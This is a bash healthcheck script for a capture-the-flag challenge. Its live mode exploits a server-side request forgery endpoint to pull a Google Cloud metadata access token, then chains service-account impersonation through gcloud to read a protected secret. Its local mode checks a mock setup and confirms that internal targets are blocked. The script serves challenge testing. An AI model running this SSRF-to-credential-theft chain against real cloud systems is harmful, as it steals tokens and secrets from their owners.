#!/usr/bin/env bash
# h01 healthcheck. local (default): build container, prove the semi-blind SSRF
# reflects a fetched body. live (LIVE=1): on the VM, SSRF the metadata token, then
# walk the two-hop impersonation chain to read the secret.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ "${LIVE:-0}" = "1" ]; then
  : "${TARGET:?TARGET=http://<vm-ip>:8001 required}"
  source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"; load_env
  PROJ="$GCP_PROJECT_ID"
  T1="$(curl -fsS "$TARGET/validate?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
        | grep -oE 'ya29[._A-Za-z0-9-]+' | head -1)"
  [ -n "$T1" ] || { echo "h01 live: no runner token"; exit 1; }
  # two-hop chain: base(runner) -> delegate(ape-relay) -> target(vault-reader), then read.
  # NOTE: gcloud has no top-level --delegates flag for this command — a delegation
  # chain is a COMMA-separated list in --impersonate-service-account, delegates first,
  # final target last.
  FLAGV="$(CLOUDSDK_AUTH_ACCESS_TOKEN="$T1" gcloud secrets versions access latest \
    --secret=ape-ride-crownjewels --project "$PROJ" \
    --impersonate-service-account="ape-relay@${PROJ}.iam.gserviceaccount.com,vault-reader@${PROJ}.iam.gserviceaccount.com" \
    2>/dev/null || true)"
  echo "$FLAGV" | grep -qE "${FLAG_PREFIX}\{" && { echo "h01 healthcheck rc=0 (live)"; exit 0; }
  echo "h01 healthcheck FAILED (live)"; exit 1
fi

# --- local: prove semi-blind SSRF reflects the fetched body, and that the guard
#     blocks internal targets (no pivot to CTFd / other teams) ---
CID=""; MOCK=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1; [ -n "$MOCK" ] && kill "$MOCK" 2>/dev/null || true' EXIT
docker build -q -t cypher-h01 "$HERE" >/dev/null
CID="$(docker run -d --add-host metadata.google.internal:host-gateway -P cypher-h01)"
PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
python3 -c 'import http.server,socketserver
class H(http.server.BaseHTTPRequestHandler):
 def do_GET(self):
  self.send_response(200);self.end_headers();self.wfile.write(b"ya29.CHAIN_START_TOKEN")
 def log_message(self,*a):pass
socketserver.TCPServer(("0.0.0.0",8598),H).serve_forever()' &
MOCK=$!; sleep 1
for i in $(seq 1 20); do curl -fsS "http://127.0.0.1:$PORT/" >/dev/null 2>&1 && break; sleep 0.5; done
BODY="$(curl -fsS "http://127.0.0.1:$PORT/validate?url=http://metadata.google.internal:8598/")"
echo "ssrf body: $BODY"
BLK="$(curl -sS "http://127.0.0.1:$PORT/validate?url=http://127.0.0.1:8598/")"
echo "internal fetch: $BLK"
if [[ "$BODY" == *ya29.CHAIN_START_TOKEN* && "$BLK" == *refused* ]]; then
  echo "h01 healthcheck rc=0 (semi-blind SSRF + internal targets blocked)"; exit 0
fi
echo "h01 healthcheck FAILED (local)"; exit 1
